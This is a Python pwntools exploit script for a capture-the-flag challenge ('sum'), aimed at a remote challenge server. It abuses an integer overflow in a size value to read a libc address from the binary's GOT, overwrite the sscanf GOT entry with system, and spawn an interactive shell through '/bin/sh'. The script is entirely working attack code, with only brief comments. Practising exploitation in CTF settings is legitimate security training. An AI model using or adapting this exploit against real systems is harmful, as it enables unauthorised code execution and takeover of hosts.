#!/usr/bin/env python3

from pwn import *

exe = ELF("./sum")
libc = ELF("./libc-2.27.so")                        # REMOTE
# libc = ELF("./libc6_2.37-0ubuntu2_amd64.so")      # LOCAL

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("sum.challs.cyberchallenge.it", 9134)

    return r


def main():
    r = conn()

    # NOTE: Integer Overflow to set a huge value as length but allocate a small amount of bytes
    # We don't care that 'calloc' fails as long as we have the opportunity to keep interact with the program
    size = b'2305843009213693953'
    leak_puts = f'get {exe.got["puts"] // 8}'.encode('ascii')   # Accesses with [r12 + rax*8]; since r12 = 0, then it's 'puts' divided by 8

    r.sendlineafter(b'> ', size)
    sleep(3)        # <--- Needed for remote connection in combination with 'clean' since the remote conn. is slower than the local one
    r.clean()       # <--- For some reason the output doesn't come as expected, we have to clear what came before it
    r.sendline(leak_puts)

    output = r.recvlineS()
    print(output, hex(int(output)))

    libc.address = int(output) - libc.symbols['puts']
    log.info(f'Found LIBC base address: {hex(libc.address)}')

    sscanf2system = f'set {exe.got["__isoc99_sscanf"] // 8} {libc.symbols["system"]}'.encode('ascii')
    r.sendlineafter(b'> ', sscanf2system)

    log.warn('"sscanf" function successfully overwritten!')
    r.sendlineafter(b'> ', b'/bin/sh\x00')
    r.clean()
    r.interactive('> ')


if __name__ == "__main__":
    main()